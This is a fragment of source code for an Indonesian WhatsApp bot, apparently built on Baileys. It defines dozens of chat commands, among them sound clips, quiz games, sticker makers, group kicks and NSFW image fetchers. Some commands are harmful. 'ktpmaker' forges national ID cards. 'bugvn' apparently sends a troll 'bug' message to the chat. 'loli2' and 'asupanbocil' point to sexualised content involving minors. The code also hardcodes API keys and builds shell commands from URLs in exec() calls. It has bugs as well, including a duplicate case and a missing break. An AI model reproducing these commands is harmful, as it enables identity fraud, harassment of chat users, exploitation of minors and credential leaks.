                    client.sendMessage(from, sound16, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                    break                
                    case 'sound17':  
                    const sound17 = fs.readFileSync('sound/sound17.mp3')
                    client.sendMessage(from, sound17, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                    break
                    case 'sound18':  
                    const sound18 = fs.readFileSync('sound/sound18.mp3')
                    client.sendMessage(from, sound18, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                    break
                     case 'jagoan':  
                      const jagoan = fs.readFileSync('sound/jagoan.mp3')
                    client.sendMessage(from, jagoan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                    break
                    case 'berisik':  
                      const berisik = fs.readFileSync('sound/berisik.mp3')
                    client.sendMessage(from, berisik, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                    break
                    case 'bantai':  
                    const bantai = fs.readFileSync('sound/bantai.mp3')
                    client.sendMessage(from, bantai, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                    break
                     case 'anjay':  
                    const anjay = fs.readFileSync('sound/anjay.mp3')
                    client.sendMessage(from, anjay, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                    break
                       case 'araara':  
                    const araara = fs.readFileSync('sound/araara.mp3')
                    client.sendMessage(from, araara, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                    break
                  case 'wibu':  
                     const wibu = fs.readFileSync('sound/wibu.mp3')
                    client.sendMessage(from, wibu, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                    break                   
                     case 'sound19':  
                    const sound19 = fs.readFileSync('sound/sound19.mp3')
                    client.sendMessage(from, sound19, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                    break
                    case 'sound20':  
                    const sound20 = fs.readFileSync('sound/sound20.mp3')
                    client.sendMessage(from, sound20, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                    break
                    case 'sound21':  
                    const sound21 = fs.readFileSync('sound/sound21.mp3')
                    client.sendMessage(from, sound21, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                    break
                  case 'sound22':  
                    const sound22 = fs.readFileSync('sound/sound22.mp3')
                    client.sendMessage(from, sound22, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                    break
                 case 'sound23':  
                   const sound23 = fs.readFileSync('sound/sound23.mp3')
                    client.sendMessage(from, sound23, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                    break
                    case 'sound24':  
                   const sound24 = fs.readFileSync('sound/sound24.mp3')
                    client.sendMessage(from, sound24, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                    break
                    case 'sound25':  
                   const sound25 = fs.readFileSync('sound/sound25.mp3')
                    client.sendMessage(from, sound25, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                    break
                    case 'sound26':  
                   const sound26 = fs.readFileSync('sound/sound26.mp3')
                    client.sendMessage(from, sound26, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                    break
                    case 'sound27':  
                   const sound27 = fs.readFileSync('sound/sound27.mp3')
                    client.sendMessage(from, sound27, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                    break
                    case 'sound28':  
                   const sound28 = fs.readFileSync('sound/sound28.mp3')
                    client.sendMessage(from, sound28, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                    break
                    case 'sound29':  
                   const sound29 = fs.readFileSync('sound/sound29.mp3')
                    client.sendMessage(from, sound29, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                    break
                    case 'baby':  
                    const baby = fs.readFileSync('sound/baby.mp3')
                    client.sendMessage(from, baby, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                    break
               case 'anak':  
                    const anak = fs.readFileSync('sound/anak.mp3')
                    client.sendMessage(from, anak, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                    break
                    case 'lemmer':  
                    const lemmer = fs.readFileSync('sound/lemmer.mp3')
                    client.sendMessage(from, lemmer, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                    break
                 case 'bugvn':  
                    const yamete = fs.readFileSync('sound/yamete.mp3')
                    client.sendMessage(from, yamete, MessageType.audio, {quoted: ftroli, mimetype: 'audio/mp4', ptt:true})
                    await client.toggleDisappearingMessages(from, 0)
                    await client.toggleDisappearingMessages(from, 0)
                    break 										
					 case 'asupanbocil':            
            ojan = await fetchJson(`https://janbot-api.herokuapp.com/api/asupan/bocil`)
     		pideo = await getBuffer(ojan.result.url)
	    	client.sendMessage(from, pideo, video, {quoted: mek})			
            break;
            	case 'asupanukhty':            
            ojan = await fetchJson(`https://janbot-api.herokuapp.com/api/asupan/ukhty`)
     		pideo = await getBuffer(ojan.result.url)
	    	client.sendMessage(from, pideo, video, {quoted: mek})				
            break;
            case 'asupansantuy':			                  			                  
                ojan = await fetchJson(`https://janbot-api.herokuapp.com/api/asupan/santuy`)
				pideo = await getBuffer(ojan.result.url)
				client.sendMessage(from, pideo, video, {quoted: mek})					
                break;
                case 'asupanrika':            
            ojan = await fetchJson(`https://api-idoganz.herokuapp.com/api/asupan/rikagusriani?apikey=Alphabot`)
     		pideo = await getBuffer(ojan.result.url)
	    	client.sendMessage(from, pideo, video, {quoted: mek})			
            break;
            case 'asupanhijaber':            
            ojan = await fetchJson(`https://api-idoganz.herokuapp.com/api/asupan/hijaber?apikey=Alphabot`)
     		pideo = await getBuffer(ojan.result.url)
	    	client.sendMessage(from, pideo, video, {quoted: mek})			
            break;            
            case 'fotocecan':                       
            ojan = await fetchJson(`https://janbot-api.herokuapp.com/api/asupan/cecan`)
     		pideo = await getBuffer(ojan.result.url)
	    	client.sendMessage(from, pideo, image, {quoted: mek})			
            break;
            case 'fotoukhty':          
            ojan = await fetchJson(`https://janbot-api.herokuapp.com/api/asupan/bocil`)
     		pideo = await getBuffer(ojan.result.url)
	    	client.sendMessage(from, pideo, image, {quoted: mek})			
            break;            
            case 'asupanghea':            
            ojan = await fetchJson(`https://janbot-api.herokuapp.com/api/asupan/geayubi`)
     		pideo = await getBuffer(ojan.result.url)
	    	client.sendMessage(from, pideo, video, {quoted: mek})			
            break;                     
            case 'wallpaperteknologi':           
            ojan = await fetchJson(`https://janbot-api.herokuapp.com/api/wallpaper/teknologi`)
     		pideo = await getBuffer(ojan.result)
	    	client.sendMessage(from, pideo, image, {quoted: mek})
			break;
			case 'wallpaperprogramming':            
            ojan = await fetchJson(`https://janbot-api.herokuapp.com/api/wallpaper/programming`)
     		pideo = await getBuffer(ojan.result)
	    	client.sendMessage(from, pideo, image, {quoted: mek})			
            break;
            case 'wallpapercyber':            
            ojan = await fetchJson(`https://janbot-api.herokuapp.com/api/wallpaper/cyberspace`)
     		pideo = await getBuffer(ojan.result)
	    	client.sendMessage(from, pideo, image, {quoted: mek})			
            break;			    						
				case 'tebakbendera':
					anu = await fetchJson(`https://api.xteam.xyz/game/tebakbendera?APIKEY=b6923d4a764d6b45927a0099`)
					tebakbender = `*bendera apa ini?*\n${anu.result.flag}`
					setTimeout( () => {
					client.sendMessage(from, '*Jawaban :* '+anu.result.name, text, {quoted: ftroli}) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_10 Detik lagi_', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_20 Detik lagi_', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_30 Detik lagi_', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, tebakbender, text, {quoted: ftroli}) // ur cods
					}, 0) // 1000 = 1s,					
					break; 
                case 'tebakgambar3':
					anu = await fetchJson(`http://api.lolhuman.xyz/api/tebak/gambar?apikey=${LolHuman}`, {method: 'get'})
					bufferkkk = await getBuffer(anu.result.image)
					setTimeout( () => {
					client.sendMessage(from, '*Jawaban :* '+anu.result.answer, text, {quoted: ftroli}) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_10 Detik lagi_', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_20 Detik lagi_', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_30 Detik lagi_', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, bufferkkk, image, { caption: '_Jelaskan Apa Maksud Gambar Ini_', quoted: ftroli}) // ur cods
					}, 0) // 1000 = 1s,					
					break;  
				case 'family1002':
					anu = await fetchJson(`http://api.lolhuman.xyz/api/tebak/family100?apikey=${LolHuman}`, {method: 'get'})
					family = `*${anu.result.question}*`
					setTimeout( () => {
					client.sendMessage(from, '*Jawaban :* '+anu.result.aswer, text, {quoted: ftroli}) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_10 Detik lagi_', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_20 Detik lagi_', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_30 Detik lagi_', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, family, text, {quoted: lol}) // ur cods
					}, 0) // 1000 = 1s,					
					break;
					case 'caklontong2':
					anu = await fetchJson(`http://api.lolhuman.xyz/api/tebak/caklontong?apikey=${LolHuman}`, {method: 'get'})
					caklontong = `*${anu.result.question}*`
					setTimeout( () => {
					client.sendMessage(from, '*Jawaban :* '+anu.result.answer, text, {quoted: ftroli}) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_10 Detik lagi_', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_20 Detik lagi_', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_30 Detik lagi_', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, caklontong, text, {quoted: ftroli}) // ur cods
					}, 0) // 1000 = 1s,					
					break; 
					case 'nhentai':
                    if (args.length == 0) return reply(`Example: ${prefix + command} 344253`)
                    henid = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${henid}?apikey=${LolHuman}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Title Native : ${get_result.nativeTitle}\n`                   
                    get_info = get_result.details
                    ini_txt += `Parodies : ${get_info.parodies}\n`
                    ini_txt += `Character : ${get_info.characters.join(", ")}\n`
                    ini_txt += `Tags : ${get_info.tags.join(", ")}\n`
                    ini_txt += `Artist : ${get_info.artists}\n`
                    ini_txt += `Group : ${get_info.groups}\n`
                    ini_txt += `Languager : ${get_info.languages.join(", ")}\n`
                    ini_txt += `Categories : ${get_info.categories}\n`
                    ini_txt += `Pages : ${get_info.pages}\n`
                    ini_txt += `Uploaded : ${get_info.uploaded}\n`
                    reply(ini_txt)
                    break;
                case 'nhentaipdf':
                    if (args.length == 0) return reply(`Example: ${prefix + command} 344253`)
                    henid = args[0]
                    get_result = await fetchJson(`https://api-lpg.herokuapp.com/nsfw/nhentaipdf?code=${henid}`)
                    get_result = get_result.result
                    ini_buffer = await getBuffer(get_result)
                    await client.sendMessage(from, ini_buffer, document, { quoted: mek, mimetype: Mimetype.pdf, filename: `${henid}.pdf` })
                    break;
                case 'nhentaisearch':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api-lpg.herokuapp.com/nsfw/nHentaiSearch?query=${query}`)
                    get_result = get_result.result                    
                    ini_txt = "Result : \n"
                    for (var x of get_result) {
                        ini_txt += `Id : ${x.id}\n`
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Bahasa : ${x.language}\n`                       
                    }
                    reply(ini_txt)
                    break;
                case 'nekopoi':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://nekopoi.care/isekai-harem-monogatari-episode-4-subtitle-indonesia/`)
                    ini_url = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/nekopoi?apikey=${LolHuman}&url=${ini_url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.anime}\n`
                    ini_txt += `Porducers : ${get_result.producers}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Size : ${get_result.size}\n`
                    ini_txt += `Sinopsis : ${get_result.sinopsis}\n`
                    link = get_result.link
                    for (var x in link) {
                        ini_txt += `\n${link[x].name}\n`
                        link_dl = link[x].link
                        for (var y in link_dl) {
                            ini_txt += `${y} - ${link_dl[y]}\n`
                        }
                    }
                    ini_buffer = await getBuffer(get_result.thumb)
                    await client.sendMessage(from, ini_buffer, image, { quoted: mek, caption: ini_txt })
                    quoted: mek
                case 'nekopoisearch':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Isekai Harem`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/nekopoisearch?apikey=${LolHuman}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n\n`
                    }
                    reply(ini_txt)
                    break;
                    case 'tagsticker':				 
                    if (sender.split("@")[0])
                    if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
                        const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        filePath = await client.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
                        var value = args.join(" ")
                        var group = await client.groupMetadata(from)
                        var member = group['participants']
                        var mem = []
                        member.map(async adm => {
                            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                        })
                        var options = {
                            contextInfo: { mentionedJid: mem },
                            quoted: mek
                        }
                        ini_buffer = fs.readFileSync(filePath)
                        client.sendMessage(from, ini_buffer, sticker, options)
                        fs.unlinkSync(filePath)
                    } else {
                        reply(`Tag sticker yang sudah dikirim`)
                    }
                    break 
 case 'ownergrup':
				  case 'ownergroup':
               client.updatePresence(from, Presence.composing) 
              options = {
          text: `Owner Group ini adalah : wa.me/${from.split("-")[0]}`,
          contextInfo: { mentionedJid: [from] }
           }
           client.sendMessage(from, options, text, { quoted: mek } )
				break
			    case 'edotensei':
					  case 'edotense':
					if (!isGroupAdmins && !isOwner)return reply(dpuhy.GrupAdmin)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di edotense!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = '𝘴𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺, edotense :\n'
						for (let _ of mentioned) {
							teks += `@${_.split('@')[0]}\n`
						}
						mentions(teks, mentioned, true)
						client.groupRemove(from, mentioned)
					} else {
						mentions(`Perintah di terima, edotense : @${mentioned[0].split('@')[0]}`, mentioned, true)
						client.groupRemove(from, mentioned)
					}
					break
                   case 'ktpmaker':
                    if (args.length == 0) return reply(`Usage: ${prefix + command} nik|provinsi|kabupaten|nama|tempat, tanggal lahir|jenis kelamin|jalan|rt/rw|kelurahan|kecamatan|agama|status nikah|pekerjaan|warga negara|berlaku sampai|url_image\n\nExample: ${prefix + command} 456127893132123|bumipertiwi|fatamorgana|LoL Human|mars, 99-99-9999|belum ditemukan|jl wardoyo|999/999|turese|imtuni|alhamdulillah islam|jomblo kack|mikirin dia|indo ori no kw|hari kiamat|https://i.ibb.co/Xb2pZ88/test.jpg`)
                    get_args = args.join(" ").split("|")
                    nik = get_args[0]
                    prov = get_args[1]
                    kabu = get_args[2]
                    name = get_args[3]
                    ttl = get_args[4]
                    jk = get_args[5]
                    jl = get_args[6]
                    rtrw = get_args[7]
                    lurah = get_args[8]
                    camat = get_args[9]
                    agama = get_args[10]
                    nikah = get_args[11]
                    kerja = get_args[12]
                    warga = get_args[13]
                    until = get_args[14]
                    img = get_args[15]
                    reply('waitt')                    
                      bikin = (`https://fdz-app.herokuapp.com/api/maker/ktp?nik=${nik}&nama=${name}&ttl=${ttl}&jk=${jk}&gdarah=-&almt=${jl}&rt-rw=${rtrw}&kel=${lurah}&kcmtn=${camat}&agma=${agama}&status=${nikah}&kerja=${kerja}&negara=${warga}&berlaku=${until}&prov=${prov}&kab=${kabu}&picurl=${img}`)
                      console.log(bikin)
                    imge = await getBuffer(bikin)
                    await client.sendMessage(from, imge, image, { quoted: mek });
                    break; 
                     case 'awoo':					
					gatauda = body.slice(6)					
					data = await fetchJson('https://waifu.pics/api/sfw/awoo')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					 case 'trapnime':					
					gatauda = body.slice(6)					
					data = await fetchJson('https://waifu.pics/api/sfw/trap')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					 case 'blowjob':					
					gatauda = body.slice(9)					
					data = await fetchJson('https://waifu.pics/api/sfw/blowjob')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;                                     
                    case 'loli2':					
					gatauda = body.slice(7)					
					data = await fetchJson('https://akaneko-api.herokuapp.com/api/loli')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
		case 'hentai2':				
					gatauda = body.slice(9)					
					data = await fetchJson('https://janbot-api.herokuapp.com/api/nsfw/hentai')
					hasil = await getBuffer(data.result)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'hentai2':				
					gatauda = body.slice(9)					
					data = await fetchJson('https://janbot-api.herokuapp.com/api/sfw/waifu')
					hasil = await getBuffer(data.result)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'yuri':				
					gatauda = body.slice(6)					
					data = await fetchJson('https://janbot-api.herokuapp.com/api/nsfw/yuri')
					hasil = await getBuffer(data.result)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					 case 'masturbation':				
					gatauda = body.slice(14)					
					data = await fetchJson('https://janbot-api.herokuapp.com/api/nsfw/masturbation')
					hasil = await getBuffer(data.result)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'pussy':				
					gatauda = body.slice(7)					
					data = await fetchJson('https://janbot-api.herokuapp.com/api/nsfw/pussy')
					hasil = await getBuffer(data.result)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'hentaigif':				
					gatauda = body.slice(7)					
					data = await fetchJson('https://janbot-api.herokuapp.com/api/nsfw/hentaigif')
					hasil = await getBuffer(data.result)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'ero':				
					gatauda = body.slice(5)					
					data = await fetchJson('https://janbot-api.herokuapp.com/api/nsfw/ero')
					hasil = await getBuffer(data.result)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'jahi':				
					gatauda = body.slice(6)					
					data = await fetchJson('https://janbot-api.herokuapp.com/api/nsfw/jahi')
					hasil = await getBuffer(data.result)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'orgy':				
					gatauda = body.slice(6)					
					data = await fetchJson('https://janbot-api.herokuapp.com/api/nsfw/orgy')
					hasil = await getBuffer(data.result)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'blowjob2':				
					gatauda = body.slice(10)					
					data = await fetchJson('https://janbot-api.herokuapp.com/api/nsfw/blowjob')
					hasil = await getBuffer(data.result)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'foot':				
					gatauda = body.slice(7)					
					data = await fetchJson('https://janbot-api.herokuapp.com/api/nsfw/foot')
					hasil = await getBuffer(data.result)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'ahegao2':				
					gatauda = body.slice(9)					
					data = await fetchJson('https://janbot-api.herokuapp.com/api/nsfw/ahegao')
					hasil = await getBuffer(data.result)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'panties':				
					gatauda = body.slice(9)					
					data = await fetchJson('https://janbot-api.herokuapp.com/api/nsfw/panties')
					hasil = await getBuffer(data.result)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'cum2':				
					gatauda = body.slice(6)					
					data = await fetchJson('https://janbot-api.herokuapp.com/api/nsfw/cum')
					hasil = await getBuffer(data.result)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'gangbang':				
					gatauda = body.slice(10)					
					data = await fetchJson('https://janbot-api.herokuapp.com/api/nsfw/gangbang')
					hasil = await getBuffer(data.result)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'bdsm':				
					gatauda = body.slice(6)					
					data = await fetchJson('https://janbot-api.herokuapp.com/api/nsfw/bdsm')
					hasil = await getBuffer(data.result)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;					         
		        case 'watak':                                  
				watak = body.slice(1)
				const wa =['Penyayang','Pemurah','Pemarah','Pemaaf','Penurut','Baik','Baperan','Baik Hati','penyabar','UwU','top deh, pokoknya','Suka Membantu']
				const tak = wa[Math.floor(Math.random() * wa.length)]
				client.sendMessage(from, 'Pertanyaan : *'+watak+'*\n\nJawaban : '+ tak, text, { quoted: ftroli })				
				break;
		        case 'hobby':              
				hobby = body.slice(1)
				const hob =['Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
				const by = hob[Math.floor(Math.random() * hob.length)]
				client.sendMessage(from, 'Pertanyaan : *'+hobby+'*\n\nJawaban : '+ by, text, { quoted: ftroli })				
				break;
                case 'jadian':				 
				jds = []
				const jdii = groupMembers
				const koss = groupMembers
				const akuu = jdii[Math.floor(Math.random() * jdii.length)]
				const diaa = koss[Math.floor(Math.random() * koss.length)]
				teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]} ♥️ @${diaa.jid.split('@')[0]} `
				jds.push(akuu.jid)
				jds.push(diaa.jid)
				mentions(teks, jds, true)			
				break;
		case 'unmute':
                if (!mek.key.fromMe) return reply('*Kamu Owner?*')
                client.modifyChat(from, ChatModification.unmute)
                reply('*succes unmute this chat*')
                console.log('𝘴𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺 unmute chat = ' + from)
                break;
			    case 'unpin':
                if (!mek.key.fromMe) return reply('*Kamu Owner?*')
                client.modifyChat(from, ChatModification.unpin)
                reply('*𝘴𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺 unpin this chat*')
                console.log('unpin chat = ' + from)
                break;
                case 'mute':
                if (!mek.key.fromMe) return reply('*Kamu Owner?*')
                client.modifyChat(from, ChatModification.mute, 24*60*60*1000)
                reply('*succes mute this chat*')
                console.log('succes mute chat = ' + from)
                break;                            
            case 'pin':
                if (!mek.key.fromMe) return reply('*Kamu Owner?*')
                client.modifyChat(from, ChatModification.pin)
                reply('*succes pin this chat*')
                console.log('pinned chat = ' + from)
                break;                
case  'trigger':
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek					
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  client.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/triggered?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					client.sendMessage(from, fs.readFileSync(rano), sticker, {qouted: mek})
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break;
					 case 'smeme':                 
              top = arg.split('|')[0]
              bottom = arg.split('|')[1]
              var imgbb = require('imgbb-uploader')
              if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
              reply(mess.wait)
              ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
              owgi = await client.downloadAndSaveMediaMessage(ger)
              anu = await imgbb("39d895963468b814fad0514bd28787e2", owgi)
              teks = `${anu.display_url}`
              ranp = getRandom('.gif')
              rano = getRandom('.webp')
              anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`
              sendStickerFromUrl(from, `${anu1}`, mess.success)
              } else {
              reply('Gunakan foto/stiker!')
}
               break;
               case 'memeimg':                 
              top = arg.split('|')[0]
              bottom = arg.split('|')[1]
              var imgbb = require('imgbb-uploader')
              if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
              reply(mess.wait)
              ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
              owgi = await client.downloadAndSaveMediaMessage(ger)
              anu = await imgbb("39d895963468b814fad0514bd28787e2", owgi)
              teks = `${anu.display_url}`
              ranp = getRandom('.gif')
              rano = getRandom('.webp')
              anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`
              sendMediaURL(from, `${anu1}`, mess.success)
              } else {
              reply('Gunakan foto/stiker!')
}
               break;
		case   'gay':		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  client.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/gay?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					client.sendMessage(from, fs.readFileSync(rano), sticker, {qouted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break;
					case  'wasted1':
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek					
					owgi = await  client.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu2 = `https://some-random-api.ml/canvas/wasted?avatar=${teks}`
					exec(`wget ${anu2} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					client.sendMessage(from, fs.readFileSync(rano), sticker, {qouted: mek})
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
					break; 
case  'stickers':
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek					
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  client.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `http://api-lpg.herokuapp.com/converter/towebp?url=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					client.sendMessage(from, fs.readFileSync(rano), sticker, {qouted: mek})
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break;
case 'wanted':
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
owgi = await client.downloadAndSaveMediaMessage(ted)
anu = await imgbb("30e3b3d7157a3cee502760a4a17c20fd", owgi)
